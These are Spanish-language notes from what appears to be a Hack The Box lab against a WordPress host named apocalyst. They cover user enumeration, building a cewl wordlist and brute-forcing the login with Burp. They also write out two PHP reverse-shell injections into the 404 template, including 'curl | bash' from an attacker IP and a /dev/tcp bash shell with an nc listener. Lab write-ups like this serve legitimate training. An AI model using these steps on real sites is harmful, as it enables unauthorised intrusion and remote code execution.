* Panel de login --> /wp-login.php
* Enumeración de usuarios --> /wp-json/wp/v2/users/
* Probar usuarios válidos --> en el panel de login devuelve que la contraseña para ese usuario no es válida.
* Crear diccionario con cewl basándose en las palabras del servicio web **
 `cewl -w diccionario.txt http://apocalyst.htb`
 * Información útil --> /wp-config.php
 
** Fuerza bruta sobre el panel de login **
 >Vía Burpsuite con un ataque Sniper
 > Se captura una petición de autenticación sobre un usuario que sabemos que es válido. Sobre el campo contraseña creamos una ataque tipo Sniper que irá probando diferentes contraseñas de un listado.

 >Con Bash
	

 >Con Python


** Reverse shell gracias al fichero 404.php **
> Modificación del fichero 404.php en --> Appearance - Editor - 404 template
> Añadimos una nueva línea al fichero --> `<?php system("curl 10.10.14.19 | bash"); ?>`
> Creamos fichero index.html en equipo local para dar respuesta a la petición con curl:  `#!/bin/bash
bash -i >& /dev/tcp/10.10.14.19/443 0>&1`
> Servidor web en escucha para dar respuesta a curl --> `python -m SimpleHTTPServer 80`
> Puerto en escucha --> `nc -nlvp 443`
> Apuntamos a la página 404.php --> http://apocalyst.htb/?p=404.php

** Reverse shell directa en el fichero 404.php **
> Modificamos el fichero 404.php incluyendo una nueva línea para ejecutar una reverse shell
> `<?php system("bash -c ' bash -i >& /dev/tcp/10.10.14.7/443 0>&1'"); ?>`
> Puerto en escucha --> `nc -nlvp 443`
> Apuntamos a la página 404.php --> http://apocalyst.htb/?p=404.php


